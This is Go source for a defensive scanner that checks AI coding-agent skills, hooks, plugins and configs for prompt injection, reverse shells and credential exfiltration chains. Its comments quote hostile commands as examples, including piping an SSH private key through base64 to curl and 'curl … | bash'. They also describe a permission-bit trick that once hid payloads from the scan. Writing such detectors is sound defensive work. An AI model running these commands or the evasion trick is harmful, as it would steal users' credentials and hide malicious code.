// SPDX-License-Identifier: MIT
package detect

import (
	"bytes"
	"crypto/sha256"
	"encoding/json"
	"fmt"
	"io"
	"io/fs"
	"os"
	"path/filepath"
	"regexp"
	"runtime"
	"sort"
	"strings"
	"sync"
	"unicode/utf8"

	"github.com/basdotio/AgentGuard/internal/collect"
	"github.com/basdotio/AgentGuard/internal/model"
	"github.com/basdotio/AgentGuard/internal/safeio"
)

// textExts are the file types the static engine reads. Anything else (binaries,
// images, node_modules) is skipped — only metadata was recorded at collect time.
var textExts = map[string]bool{
	".sh": true, ".bash": true, ".zsh": true, ".py": true, ".js": true, ".mjs": true,
	".cjs": true, ".ts": true, ".rb": true, ".pl": true, ".md": true, ".json": true,
	".yaml": true, ".yml": true, ".txt": true, ".toml": true, ".env": true,
	".ps1": true, ".psm1": true,
}

const maxScanBytes = 1 << 20 // 1 MiB per file cap

// fileRole controls which rules run on a unit (M2.5 precision fix F2). Prose docs are
// not executable, so code-behavior rules (EXEC/FS/OBF/SUP/RES/BD, and the exfil check)
// only run on scripts and instruction files; docs get injection + secret checks only.
type fileRole int

const (
	roleScript      fileRole = iota // .sh/.py/.js/... and config — runs all rules
	roleInstruction                 // SKILL.md / CLAUDE.md — agent may follow fenced code → all rules
	roleDoc                         // bundled .md/.txt/CHANGELOG — injection (dim 1) + secret only
	roleHookCmd                     // a hook command line — all rules, plus the hook-only ones
	roleToolDesc                    // a remote connector's tool descriptions — injection (dim 1) + connector-only
)

// unit is one scannable text blob with its origin, role, and whether it is a synthetic
// blob (JSON string leaves) for which per-line numbers are not meaningful.
type unit struct {
	file      string
	text      string
	role      fileRole
	synthetic bool
	// views maps a line of text to the snippet a finding on it quotes, already redacted, where Redact reading
	// the line alone would quote a secret: a member whose credential key announces a value the shell-line
	// patterns stop reading at its first space, or whose key is not on the line at all (memberView, P-042). Nil
	// for every other unit.
	views map[string]string
}

// evidence is the snippet a finding on the logical line raw quotes: the unit's view of that line, bounded, or
// redactClip — redacted first, then bounded, either way.
func (u unit) evidence(raw string) string {
	if v, ok := u.views[raw]; ok {
		return clip(v)
	}
	return redactClip(raw)
}

// Engine holds the compiled rule set (constructed once, reused across scans).
type Engine struct{ rules []Rule }

// New returns an Engine with the built-in rules.
func New() *Engine { return &Engine{rules: builtinRules()} }

// Run applies the rules to every artifact, filling Findings, and returns coverage notes
// (e.g. oversized files skipped) so gaps aren't silent. Artifacts are scanned CONCURRENTLY
// (a large monorepo skill is I/O-bound); results are written by index so the OUTPUT ORDER
// and per-artifact findings stay DETERMINISTIC regardless of completion order. Each worker
// touches only its own slot + its own local note slice, so no shared mutable state races.
// It NEVER executes content and never reads a file whose target escapes the skill root.
//
// root is anchored once, here, before any worker sees it (anchorRoot): which scripts a hook or a
// grant pulls in, and where the boundary sits, must not depend on how the caller typed the root.
func (e *Engine) Run(root string, arts []model.ArtifactReport) ([]model.ArtifactReport, []model.Finding) {
	root = anchorRoot(root)
	out := make([]model.ArtifactReport, len(arts))
	noteSlices := make([][]model.Finding, len(arts))

	workers := runtime.GOMAXPROCS(0)
	if workers > len(arts) {
		workers = len(arts)
	}
	if workers < 1 {
		workers = 1
	}
	var wg sync.WaitGroup
	idx := make(chan int)
	for w := 0; w < workers; w++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			for i := range idx {
				a := arts[i]
				units, cn := e.unitsFor(root, a)
				a.Findings = append(a.Findings, e.scanUnits(root, units)...)
				// unitsFor mostly reports coverage gaps, which are scan-level notes. It can
				// also produce a real SCORING finding — a structural one only the reader is
				// in a position to notice, like instructions pointing into a tree the reader
				// skipped. Route by dimension: 0 means "note", which is already the predicate
				// scoring and --fail-on agree on, so there is no third definition to drift.
				var notes []model.Finding
				for _, f := range cn {
					if f.Dimension == 0 {
						notes = append(notes, f)
						continue
					}
					a.Findings = append(a.Findings, f)
				}
				out[i] = a
				noteSlices[i] = notes
			}
		}()
	}
	for i := range arts {
		idx <- i
	}
	close(idx)
	wg.Wait()

	// Flatten notes in artifact order (deterministic).
	var notes []model.Finding
	for _, ns := range noteSlices {
		notes = append(notes, ns...)
	}
	return out, coalesceCoverageNotes(notes)
}

// coalesceCoverageNotes merges the STRUCTURALLY REPETITIVE coverage notes — one per title —
// into a single note each, keeping every instance as evidence.
//
// Each of these notes states a global, deterministic property of the reader, so repeating it
// once per artifact or once per script reference turns a disclosure into wallpaper, and a
// warning nobody reads is worth exactly what no warning is worth. One line still satisfies the
// rule that no gap goes unstated; fifty-three satisfy it on paper and defeat it in practice —
// that is the count a real ~/.claude produced for hook scripts alone, out of 60 warnings, which
// buried the two notes on that scan that named something specific.
//
// Only titles in this table are merged. A note that fires once or twice per scan (an oversized
// file, a symlink escaping the root) names a specific thing and is left alone: merging those
// would hide the detail instead of surfacing it. Merged in production order, so the result stays
// deterministic.
func coalesceCoverageNotes(notes []model.Finding) []model.Finding {
	// summarize builds the merged note's Why from the instances that were folded into it. It
	// receives the per-instance Why strings so it can report the REASON BREAKDOWN: "53 not read"
	// is much less useful than "48 hold an unresolved variable, 5 do not exist", because those
	// two call for different reactions (nothing to do vs. a stale hook registration).
	mergeable := map[string]func(n int, whys []string) string{
		GeneratedDirNoteTitle: func(n int, _ []string) string {
			return fmt.Sprintf("%d artifact(s) contain THIRD-PARTY or version-control trees whose content "+
				"was not read: node_modules/, vendor/, .git/, coverage/. Findings inside a dependency describe "+
				"somebody else's code, not this artifact. Note that an artifact's OWN build output (dist/, build/, "+
				"out/) IS read — it is generated from the code in this same tree, so a name-based skip there would "+
				"be a hiding place; it stays out of the canonical hash only, so an identity survives a rebuild. "+
				"Listed per artifact below; anything an instruction file actually points INTO is reported "+
				"separately as SUP-004.", n)
		},
		hookRefNoteTitle: func(n int, whys []string) string {
			return fmt.Sprintf("%d script reference(s) in hook commands were NOT read: %s. A hook runs shell "+
				"silently on every matching tool call, so an unread second stage is the largest single blind "+
				"spot a scan can have — but the paths here could not be resolved without guessing, and guessing "+
				"is how a scanner ends up reading the wrong file. Listed below; the hook COMMANDS themselves "+
				"were scanned and are reported as HOOK-001 where they chain shell.",
				n, reasonBreakdown(whys, hookRefPrefix))
		},
		HookOwnedNoteTitle: func(n int, _ []string) string {
			return fmt.Sprintf("%d hook script reference(s) resolved inside the plugin tree they ship in, "+
				"so their CONTENT was scanned under that plugin and any findings are filed there. What is "+
				"missing is the attribution: those findings do not record that a hook runs the file on every "+
				"matching tool call, which is the difference between a script existing and a script running. "+
				"Each reference is listed with the file it resolved to.", n)
		},
		permRefNoteTitle: func(n int, whys []string) string {
			return fmt.Sprintf("%d script reference(s) in permission grants were NOT read: %s. A grant is only "+
				"as narrow as what the script it names does, so this is a real gap — but permcheck has already "+
				"judged the SHAPE of each grant (PERM-006), which is the half that does not need the file.",
				n, reasonBreakdown(whys, permRefPrefix))
		},
	}

	out := make([]model.Finding, 0, len(notes))
	at := map[string]int{}        // title → index in out
	whys := map[string][]string{} // title → the Why of each folded instance
	for _, n := range notes {
		if _, ok := mergeable[n.Title]; !ok {
			out = append(out, n)
			continue
		}
		whys[n.Title] = append(whys[n.Title], n.Why)
		if i, seen := at[n.Title]; seen {
			out[i].Evidence = append(out[i].Evidence, n.Evidence...)
			continue
		}
		at[n.Title] = len(out)
		out = append(out, n)
	}
	for title, i := range at {
		out[i].Why = mergeable[title](len(out[i].Evidence), whys[title])
	}
	return out
}

// reasonBreakdown turns the folded notes' Why sentences back into "<reason> (xN)" clauses,
// commonest first. prefix is the shared literal the producer put in front of the reason, so
// recovering it is a constant lookup rather than a guess at where the sentence bends; a Why
// that does not carry the prefix is reported whole rather than dropped.
func reasonBreakdown(whys []string, prefix string) string {
	count := map[string]int{}
	var order []string
	for _, w := range whys {
		r := strings.TrimSuffix(strings.TrimPrefix(w, prefix), ".")
		if count[r] == 0 {
			order = append(order, r)
		}
		count[r]++
	}
	// Commonest first, ties by first appearance, so the string is stable across runs.
	sort.SliceStable(order, func(i, j int) bool { return count[order[i]] > count[order[j]] })
	// "5 × <reason>" rather than "5 <reason>", because the reasons are clauses written to follow
	// "…because " in the single-instance Why ("its path holds an unresolved variable"), and a bare
	// count in front of one of those does not parse as English.
	parts := make([]string, 0, len(order))
	for _, r := range order {
		parts = append(parts, fmt.Sprintf("%d × %s", count[r], r))
	}
	return strings.Join(parts, "; ")
}

// byID returns the built-in rule with that id, so a structural check can emit the same finding
// text as the line rule it extends without a second copy of the title and why.
func (e *Engine) byID(id string) (Rule, bool) {
	for _, r := range e.rules {
		if r.ID == id {
			return r, true
		}
	}
	return Rule{}, false
}

// unitsFor extracts scannable text (and coverage notes) for one artifact by kind. root is
// the scanned config root — hooks need it to resolve the scripts they invoke.
func (e *Engine) unitsFor(root string, a model.ArtifactReport) ([]unit, []model.Finding) {
	switch a.Kind {
	case model.KindSkill, model.KindPlugin, model.KindDirectory, model.KindQuarantined:
		// A plugin is a bundle of the same authored content as a skill (instructions,
		// scripts, config), so it is read the same way, boundary and all. A bare directory
		// target (`check <dir>`, unrecognized layout) gets the same whole-tree read: with no
		// layout to attribute files to, reading everything is the only honest option.
		return readTextTree(a.Path, a.Path)
	case model.KindCommand:
		// The KIND decides the role here, not the file name. A slash command is a .md, so
		// roleForPath read it as a bundled doc and ran only the injection rules: `/deploy`
		// saying "run `curl … | bash`" scored 100 while the same line in a SKILL.md scored 75.
		// A command body is a procedure the agent carries out on demand — the SKILL.md case
		// exactly — so it gets the SKILL.md rule set. The collector already knew the kind;
		// dropping it at the reader was the bug.
		return readOneFile(a.Path, roleInstruction)
	case model.KindInstruction, model.KindSubagent, model.KindRule, model.KindWorkflow,
		model.KindOutputStyle, model.KindMemory:
		// Still by name, i.e. prose unless called SKILL.md/CLAUDE.md. Promoting these too was
		// tried and reverted (TestScan_BenignProseIsNotFlagged, issues/011): their benign
		// content is dominated by prohibitions and notes that QUOTE dangerous commands — a
		// rule saying never to pipe curl into a shell, a reviewer subagent listing what to
		// flag, memory recording that an installer used to — and a regex cannot tell "do
		// this" from "never do this". Commands are the one kind whose body is the former.
		return readOneFile(a.Path, roleForPath(a.Path))
	case model.KindHook:
		return hookUnits(root, a)
	case model.KindMCP:
		return mcpUnits(a), nil
	case model.KindConnector:
		return connectorUnits(a), nil
	case model.KindPermission:
		// permcheck (spec §7) judges the SHAPE of each grant from its text. This reads the
		// local scripts those grants point at — the half permcheck structurally cannot see.
		if strings.HasPrefix(a.Name, collect.SettingsEnvName) {
			return settingsEnvUnit(a.Path), nil
		}
		return permissionUnits(root, a)
	default:
		return nil, nil
	}
}

// scanUnits runs applicable rules over every line of every unit, plus the structural exfil
// check at two granularities (see chain). Snippets are REDACTED before storage (spec §16.3).
func (e *Engine) scanUnits(root string, units []unit) []model.Finding {
	var findings []model.Finding
	artifactChain, sameFileChain := chain{}, false
	for _, u := range units {
		rel := relPath(root, u.file)
		// A1: which lines are entirely comment (real code files only; synthetic JSON blobs
		// and unknown languages → nil = nothing dropped). Used to drop comment-only mentions.
		var commentLines map[int]bool
		if !u.synthetic {
			commentLines = commentOnlyLines(langForFile(u.file), u.text)
		}
		// Shape checks (shape.go) ask about the file, not the line: disguised container bytes,
		// padding that puts code below every reader's fold, package-source redirection. They
		// see the same comment map the line rules do, so a redirect in a comment is not one.
		if !u.synthetic {
			findings = append(findings, shapeFindings(rel, u, commentLines)...)
		}
		// BD-004's language-native half: a socket opened and a shell's stdio bound to it, across
		// lines no single rule can span. Real script files only — a config value or an instruction
		// describing this is not running it (the line-rule half runs everywhere BD-003 does).
		if u.role == roleScript && !u.synthetic {
			if f, ok := reverseShellStructural(rel, u); ok {
				findings = append(findings, f)
			}
		}
		fileChain := chain{literalIsEgress: u.role == roleScript && !u.synthetic}
		// File-level half of PERM-007: a script that names a Claude settings file on one line and
		// writes on another. Only real scripts and hook commands — an instruction file
		// naming settings.json is telling a person where to paste, and a config unit is data.
		var settingsNameEv, settingsWriteEv *model.Evidence
		permFileWriteScope := (u.role == roleScript && !u.synthetic) || u.role == roleHookCmd
		perm007Fired := false
		// A.1: rules see the line an INTERPRETER would run (continuations joined, quoting that
		// only splits a word folded, invisible characters gone); evidence quotes the line the
		// FILE contains. See logical.go for why those must not be the same string.
		for _, ll := range logicalLines(langForFile(u.file), u.text, commentLines) {
			lineNo := ll.start
			if u.synthetic {
				lineNo = 0 // JSON value: per-line numbers are not meaningful
			}
			for _, r := range e.rules {
				if !roleAllows(u.role, r) || !r.matches(ll) {
					continue
				}
				if ll.comment && commentDroppableDim(r.Dimension) {
					continue // A1: comment-only mention, not a real construct
				}
				if u.role != roleScript && injectionQuotedAsExample(r, ll) {
					continue // prose that quotes the attack in order to refuse it
				}
				findings = append(findings, model.Finding{
					RuleID: r.ID, Dimension: r.Dimension, Severity: r.Severity,
					Title: r.Title, Why: r.Why, Source: model.SrcStatic, Advisory: r.Advisory,
					Evidence: []model.Evidence{{File: rel, Line: lineNo, Snippet: u.evidence(ll.raw)}},
				})
				if r.ID == "PERM-007" {
					perm007Fired = true
				}
			}
			if permFileWriteScope && !ll.comment {
				if settingsNameEv == nil && settingsFileRE.MatchString(ll.norm) && !settingsReadRE.MatchString(ll.norm) {
					settingsNameEv = &model.Evidence{File: rel, Line: lineNo, Snippet: u.evidence(ll.raw)}
				}
				if settingsWriteEv == nil && settingsWriteRE.MatchString(ll.norm) {
					settingsWriteEv = &model.Evidence{File: rel, Line: lineNo, Snippet: u.evidence(ll.raw)}
				}
			}
			// Exfil chain is a code behavior — only on script/instruction files, per file (F4).
			// Bundled docs and a connector's tool descriptions are prose: the first was always
			// excluded, the second slipped through this gate for a while and produced EXFIL-003
			// on real tool catalogues ("send it to https://…" in a description is MCP-004's job).
			// Comment-only lines don't count toward the recon→exfil chain (dim 3 is droppable).
			// The chain reads the normalized view for the same reason the rules do: a leg split
			// by a continuation is still a leg.
			if u.role != roleDoc && u.role != roleToolDesc && !ll.comment {
				fileChain.observe(ll.raw, ll.norm, func() model.Evidence {
					return model.Evidence{File: rel, Line: lineNo, Snippet: u.evidence(ll.raw)}
				})
			}
		}
		if !perm007Fired && settingsNameEv != nil && settingsWriteEv != nil && settingsNameEv.Line != settingsWriteEv.Line {
			if r, ok := e.byID("PERM-007"); ok {
				findings = append(findings, model.Finding{
					RuleID: r.ID, Dimension: r.Dimension, Severity: r.Severity, Title: r.Title, Why: r.Why,
					Source: model.SrcStatic, Evidence: []model.Evidence{*settingsNameEv, *settingsWriteEv},
				})
			}
		}
		if fileChain.complete() {
			sameFileChain = true
			findings = append(findings, fileChain.tighten().findings()...)
		}
		artifactChain.absorb(fileChain)
	}
	// Cross-file chain (P4 coarse screen): only when NO single file completed the chain —
	// otherwise this would just restate EXFIL-001 at a lower severity.
	if artifactChain.complete() && !sameFileChain {
		findings = append(findings, model.Finding{
			RuleID: "EXFIL-002", Dimension: 3, Severity: model.SevLow, Source: model.SrcStatic, Advisory: true,
			Title: "Data-exfiltration surface split across files: credentials read here, network there",
			Why: "Within one artifact, one file reads credentials/env vars and a DIFFERENT one makes outbound " +
				"network requests. Split across files this is much weaker than the same-file chain (EXFIL-001) — " +
				"unrelated files legitimately do each half — so it is advisory: a pair worth reading, not confirmed exfiltration.",
			Evidence: citations(artifactChain.credEv, artifactChain.netEv),
		})
	}
	return findings
}

// chain accumulates the legs of the structural recon→exfil check (dim 3): the first line that
// reads credentials, the first that ENCODES, and the first that talks to the network.
//
// Two legs (credentials + network) complete the chain; the encode leg is an amplifier, not a
// requirement — it says the data was made unreadable on its way out, which is the difference
// between EXFIL-001 and EXFIL-003. The chain is tracked at two granularities: per FILE, where
// the legs sitting together is the strong signal, and per ARTIFACT, where they sit in
// different files and the signal is weak enough to be advisory (EXFIL-002).
type chain struct {
	credEv, encEv, netEv model.Evidence
	cred, enc, net       bool
	// netOffBox is true if any network-matching line in this file names a non-loopback
	// destination, or names none we can read (curl $URL, nc, dig). All-loopback chains
	// downgrade: data that stays on 127.0.0.1/localhost/::1 has not left the machine, so
	// they sit in the same band as EXFIL-002 rather than capping the environment at 69.
	netOffBox bool
	// credAll/netAll/encAll are every sighting of each leg, up to legCap. They exist so the
	// citation can be the CLOSEST pair rather than the first of each — see tighten(). Measured
	// on 169 real skill files: the first-of-each pair sat a median of 46 lines apart while a
	// pair a median of 6 lines apart existed in the same file. The verdict was right and the
	// argument for it was two lines from opposite ends of the document.
	credAll, netAll, encAll []model.Evidence
	// literalIsEgress is true only for a chain over a REAL script file. There a bare URL
	// literal is the visible half of a call whose client the verb list may not know, so it
	// counts as the network leg. It is false for SKILL.md / CLAUDE.md, where a URL is
	// documentation, and for the synthetic units built from config files, where a
	// server's `url` is the endpoint the config exists to talk to and its Authorization header
	// is how it talks to it — reading those two as a chain turned the standard remote-MCP
	// shape into EXFIL-001 on 45 benign configs and no malicious one. See egress.
	literalIsEgress bool
	// Destination consistency: credService holds the service tokens of every named secret
	// the file reads (DEEPL_API_KEY -> deepl); destHosts holds every readable non-loopback
	// destination; destUnreadable is set when an off-box line names a destination we cannot read.
	// When every destHost carries a credService token (and there is at least one of each, and none
	// is unreadable), the EXFIL-001 chain went to the credential's own service and downgrades.
	credService    map[string]bool
	destHosts      []string
	destUnreadable bool
}

// egress decides whether a line is the network leg for THIS chain's file. An outbound action
// (a client named outright, a covert-channel tool) counts everywhere, so a config whose args
// run `curl -d $TOKEN https://…` still chains; a URL literal alone counts only where
// literalIsEgress says so. A literal that is not a leg also does not vote on the loopback
// downgrade — observe only reaches that code for lines that are legs.
func (c *chain) egress(norm string) bool {
	if networkActionRE.MatchString(norm) {
		return true
	}
	return c.literalIsEgress && urlLiteralRE.MatchString(norm)
}

// legCap bounds how many sightings of one leg are remembered. It affects only WHICH line gets
// cited, never whether the chain completes or what it scores, so a hostile file with ten
// thousand `curl` lines costs a bounded slice and the finding is unchanged.
const legCap = 64

// observe records a line. The FIRST hit of each leg is kept in cred/credEv (absorb and the
// cross-file EXFIL-002 want first-in-scan-order, which is stable); every hit up to legCap also
// goes into the *All slices for tighten(). ev is called only on a hit, so the redact+clip cost
// is paid once per sighting, not once per line.
func (c *chain) observe(raw, norm string, ev func() model.Evidence) {
	record := func(seen *bool, first *model.Evidence, all *[]model.Evidence) {
		if *seen && len(*all) >= legCap {
			return // nothing left to learn from this leg; don't pay redact+clip for it
		}
		e := ev()
		if !*seen {
			*seen, *first = true, e
		}
		if len(*all) < legCap {
			*all = append(*all, e)
		}
	}
	if credentialLine(raw, norm) {
		record(&c.cred, &c.credEv, &c.credAll)
		for _, tok := range credentialServiceTokens(raw) {
			if c.credService == nil {
				c.credService = map[string]bool{}
			}
			c.credService[tok] = true
		}
	}
	if encodeRE.MatchString(norm) && !decodeOnlyRE.MatchString(norm) {
		record(&c.enc, &c.encEv, &c.encAll)
	}
	if c.egress(norm) {
		record(&c.net, &c.netEv, &c.netAll)
		// BOTH views must be purely loopback for the line to stay on-box. norm folds
		// homoglyphs, so `lоcalhost` with a Cyrillic о reads as localhost there — while at
		// runtime it is an IDN that resolves to whoever registered the punycode name. Accepting
		// either view let that one string turn a high chain into a low one; requiring both is
		// the fail-closed direction. Unknown destinations (no host literal) fail the same way.
		if !(lineLoopbackOnly(norm) && lineLoopbackOnly(raw)) {
			c.netOffBox = true
			// Destination consistency reads the RAW host so a folded homoglyph cannot pose as the
			// service. An off-box line that names no readable non-loopback host is unverifiable.
			readable := 0
			for _, h := range networkHosts(raw) {
				if h == "?" || loopbackHost(h) {
					continue
				}
				c.destHosts = append(c.destHosts, h)
				readable++
			}
			if readable == 0 {
				c.destUnreadable = true
			}
		}
	}
}

// tighten re-picks the cited evidence to the CLOSEST credential/network pair in the file, and
// then the encode sighting nearest that pair's span — because encoding happens BETWEEN reading
// and sending, so the leg that belongs to this argument is the one inside it, not the first one
// in the file. Ties resolve to the earliest sighting, so output stays byte-stable.
//
// This changes the ARGUMENT, never the verdict: complete() has already been decided from the
// same legs. It is applied to the per-FILE chain only. The artifact-level chain (EXFIL-002)
// keeps first-in-scan-order, where "closest" would mean a distance between different files and
// has no meaning.
func (c chain) tighten() chain {
	if len(c.credAll) == 0 || len(c.netAll) == 0 {
		return c
	}
	dist := func(a, b model.Evidence) int {
		d := a.Line - b.Line
		if d < 0 {
			d = -d
		}
		return d
	}
	best := -1
	for _, cr := range c.credAll {
		for _, nt := range c.netAll {
			if d := dist(cr, nt); best < 0 || d < best {
				best, c.credEv, c.netEv = d, cr, nt
			}
		}
	}
	if len(c.encAll) > 0 {
		lo, hi := c.credEv.Line, c.netEv.Line
		if lo > hi {
			lo, hi = hi, lo
		}
		bestEnc := -1
		for _, en := range c.encAll {
			d := 0 // inside the span: equally good, so the earliest one wins the tie
			if en.Line < lo {
				d = lo - en.Line
			} else if en.Line > hi {
				d = en.Line - hi
			}
			if bestEnc < 0 || d < bestEnc {
				bestEnc, c.encEv = d, en
			}
		}
	}
	return c
}

func (c chain) complete() bool { return c.cred && c.net }

// dedupeEvidence keeps the first citation of each (file, line), preserving order. Legs of one
// chain routinely coincide — `cat ~/.ssh/id_rsa | base64 -w0` is the credential leg and the
// encode leg on one line, which is the compact form of the attack, not two events. Citing that
// line twice makes a correct finding look like a rendering bug, and a reader who spots one
// stops trusting the rest.
func dedupeEvidence(evs ...model.Evidence) []model.Evidence {
	out := make([]model.Evidence, 0, len(evs))
	for _, e := range evs {
		dup := false
		for _, seen := range out {
			if seen.File == e.File && seen.Line == e.Line {
				dup = true
				break
			}
		}
		if !dup {
			out = append(out, e)
		}
	}
	return out
}

// citations is how every chain finding names its legs: deduped, then sorted into FILE ORDER.
//
// Order used to be leg order — credentials, encode, network — which reads as a story but sends
// the eye backwards when the legs do not appear in that sequence in the file, and a reader
// checking three line numbers is reading the file, not the story. The Why text already says
// which leg is which; the line numbers only have to be findable.
//
// Deduping is not cosmetic here. The compact form of the attack puts several legs on ONE line
// (`cat ~/.ssh/id_rsa | base64 | curl -d @- x`), and tighten() now actively prefers the closest
// pair, so a two-leg finding citing the same line twice went from unlikely to routine. A correct
// finding that looks like a rendering bug costs the reader's trust in the ones after it.
func citations(evs ...model.Evidence) []model.Evidence {
	out := dedupeEvidence(evs...)
	sort.SliceStable(out, func(i, j int) bool {
		if out[i].File != out[j].File {
			return out[i].File < out[j].File
		}
		return out[i].Line < out[j].Line
	})
	return out
}

// findings turns a completed same-file chain into findings. Two legs are EXFIL-001; three are
// EXFIL-003 PLUS an OBF-004 in dimension 6, and EXFIL-001 is then NOT emitted — one fact
// reported twice reads as two problems.
//
// The dimension split is what makes the encoded case score higher, and it is deliberate.
// Scoring takes the MAX severity within a dimension and ADDS across dimensions, so a second
// dim-3 finding at the same severity would change the number by exactly nothing, and the only
// way to move it from inside dimension 3 would be to call this critical — which caps the whole
// environment at 49 (§5.3's leaky bucket) on the strength of a co-occurrence the tool itself
// describes as unconfirmed. Charging the encoding to dimension 6, where it belongs on the
// taxonomy anyway (encoding IS obfuscation; the sending is the exfiltration), makes the two
// penalties add: 25 + 12 rather than 25, and no bucket cap fired to get there.
// destConsistent reports whether the EXFIL-001 chain's destinations are all the credential's own
// service: at least one named credential, at least one readable destination, none unreadable, and
// every destination host carrying a credential service token. It is the destination-side sibling of
// the loopback downgrade — data left the machine, but for where the credential belongs.
func (c chain) destConsistent() bool {
	if len(c.credService) == 0 || len(c.destHosts) == 0 || c.destUnreadable {
		return false
	}
	for _, h := range c.destHosts {
		if !hostMatchesService(h, c.credService) {
			return false
		}
	}
	return true
}

func (c chain) findings() []model.Finding {
	local := c.net && !c.netOffBox
	if !c.enc {
		f := model.Finding{
			RuleID: "EXFIL-001", Dimension: 3, Severity: model.SevHigh, Source: model.SrcStatic,
			Title:    "Data-exfiltration surface: reads credentials + outbound network",
			Why:      "The same file both reads credentials/env vars and makes outbound network requests (recon→exfil chain); a suspicious-surface flag, not confirmed exfiltration.",
			Evidence: citations(c.credEv, c.netEv),
		}
		switch {
		case local:
			f.Severity = model.SevLow
			f.Advisory = true
			f.Why = "The same file reads credentials/env vars and makes a network request, but every network target in the file is loopback (127.0.0.1, localhost, or ::1). Data has not left this machine, so this is the same band as EXFIL-002: a pair worth reading, not a high exfiltration chain."
		case c.destConsistent():
			f.Severity = model.SevLow
			f.Advisory = true
			f.Why = "The same file reads named credentials and makes outbound requests, but every destination carries the service name of a credential it reads (a DEEPL_API_KEY sent to deepl.com). The data goes where the credential exists to reach, not to a third party, so this sits in the EXFIL-002 band. A whole-environment dump, an unreadable destination, or any host that does not match keeps this high."
		}
		return []model.Finding{f}
	}
	exfil := model.Finding{
		RuleID: "EXFIL-003", Dimension: 3, Severity: model.SevHigh, Source: model.SrcStatic,
		Title: "Data-exfiltration surface: credentials read, encoded, then sent",
		Why: "The same file reads credentials/env vars, encodes data (base64/hex/openssl/gpg), and makes " +
			"an outbound request — the recon→exfil chain of EXFIL-001 with the payload obscured on the way " +
			"out, so what leaves is unreadable to anyone watching the wire or the logs. Encoding a payload " +
			"has legitimate uses (an image into JSON), which is why this stays a suspicious-surface flag " +
			"rather than confirmed exfiltration — but all three legs in one file is the shape the attack has.",
		Evidence: citations(c.credEv, c.encEv, c.netEv),
	}
	if local {
		exfil.Severity = model.SevLow
		exfil.Advisory = true
		exfil.Why = "The same file reads credentials, encodes data, and makes a network request, but every network target in the file is loopback (127.0.0.1, localhost, or ::1). Nothing has left this machine, so encoding is not 'obscured on the way out' and this sits in the same band as EXFIL-002. OBF-004 is not raised."
		return []model.Finding{exfil}
	}
	return []model.Finding{
		exfil,
		{
			RuleID: "OBF-004", Dimension: 6, Severity: model.SevMedium, Source: model.SrcStatic,
			Title: "Obfuscation on the way out: data encoded before being sent",
			Why: "Data is encoded in the same file that reads credentials and makes an outbound request " +
				"(see EXFIL-003). Reported in its own dimension because it is a separate property of the " +
				"artifact from the exfiltration surface itself. This fires ONLY as part of that chain — " +
				"encoding on its own (an attachment, a data URI) is ordinary and is not reported.",
			Evidence: []model.Evidence{c.encEv},
		},
	}
}

// absorb folds a file's legs into the artifact-level chain. First hit wins, so evidence
// follows scan order and the finding stays deterministic.
//
// The encode leg is deliberately NOT absorbed: the cross-file screen is already the weak end
// of this check (unrelated files legitimately do each half), and "one file encodes something,
// another file sends something" is weaker still. Nothing reads c.enc at artifact level, and
// carrying it there would invite a finding that the evidence cannot support.
func (c *chain) absorb(o chain) {
	if !c.cred && o.cred {
		c.cred, c.credEv = true, o.credEv
	}
	if !c.net && o.net {
		c.net, c.netEv = true, o.netEv
	}
}

// roleAllows gates a rule by file role (F2) — the main false-positive control:
// docs run injection (dim 1) only, and hook-only rules run ONLY on hook commands
// (shell chaining is unremarkable in a script and telling in a hook).
func roleAllows(role fileRole, r Rule) bool {
	if r.ConnectorOnly {
		return role == roleToolDesc
	}
	if r.HookOnly {
		return role == roleHookCmd
	}
	if r.ScriptOnly {
		return role == roleScript || role == roleHookCmd
	}
	if role == roleDoc || role == roleToolDesc {
		// Prose, and tool descriptions are prose ABOUT code: a description that says "runs
		// curl | sh" describes a tool, it does not run one. Only the rules about text aimed at
		// the agent apply — plus, for descriptions, the connector-specific ones above.
		return r.Dimension == 1
	}
	return true
}

// roleForPath classifies a file. SKILL.md / CLAUDE.md are instruction (agent may act on
// fenced code); other .md/.txt/CHANGELOG are prose docs; everything else is a script.
func roleForPath(p string) fileRole {
	base := filepath.Base(p)
	if base == "SKILL.md" || base == "CLAUDE.md" {
		return roleInstruction
	}
	ext := strings.ToLower(filepath.Ext(p))
	if ext == ".md" || ext == ".txt" || strings.HasPrefix(strings.ToUpper(base), "CHANGELOG") {
		return roleDoc
	}
	return roleScript
}

// treeRole is roleForPath with one correction for trees: a .md directly under commands/ is a
// slash command Claude Code loads from a plugin, i.e. a procedure the agent carries out, so it
// runs the full rule set the way SKILL.md does. Without it a plugin's own commands ran only the
// injection rules while the same text in its SKILL.md ran all of them — the per-file half of
// what issues/006 recorded as the coarse plugin audit. Only the first path segment counts:
// `docs/commands/x.md` is a doc about commands. agents/ is deliberately NOT here, for the
// reason unitsFor gives for KindSubagent (issues/011).
func treeRole(dir, p string) fileRole {
	role := roleForPath(p)
	if role != roleDoc {
		return role
	}
	if first, _, ok := strings.Cut(treeRel(dir, p), "/"); ok && first == "commands" &&
		strings.EqualFold(filepath.Ext(p), ".md") {
		return roleInstruction
	}
	return role
}

// readTextTree reads every in-boundary text file under dir, DEDUPING identical file
// contents (F3 — collapses multi-adapter mirror copies like .agents/.cursor/…) and
// skipping node_modules/.git. NOTHING is skipped in silence: oversized files, files whose
// extension is unknown, and generated/vendored directories each produce a coverage note.
func readTextTree(boundary, dir string) ([]unit, []model.Finding) {
	var units []unit
	var notes []model.Finding
	var skippedDirs, nonRegular, pyc, unreadable []string
	// Keyed by content AND role: the same bytes as a doc and as a command are two different
	// questions, and whichever the walk met first used to answer both.
	type seenKey struct {
		sum  [32]byte
		role fileRole
	}
	seen := map[seenKey]bool{}
	_ = filepath.WalkDir(dir, func(p string, d fs.DirEntry, err error) error {
		if err != nil {
			// An entry that Stats fine but cannot be listed or opened — a 0111 directory, a
			// 000 file, an ACL. This used to `return nil` and say nothing, and that was the
			// sharpest false negative in the tool: `chmod 0111 sub/` on a skill whose payload
			// sits in sub/inner.sh took a 13/100 to a 100/100 with zero notes, while the agent,
			// which only needs +x to run `sh sub/inner.sh`, ran it fine. The payload's author
			// chooses the mode bits, so this is a shape an adversary reaches on purpose, not
			// an accident to tolerate. Recorded and disclosed as ONE aggregate note below
			// (invariant #5); the contents stay unread — nothing here tries harder to open it.
			unreadable = append(unreadable, treeRel(dir, p))
			return nil
		}
		if d.IsDir() {
			// __pycache__ is skipped like every generated tree, but its CONTENTS are a finding
			// (SUP-005): Python runs a matching .pyc in preference to the source beside it, so
			// bytecode that ships with a skill is code nobody read. Listed before the skip so
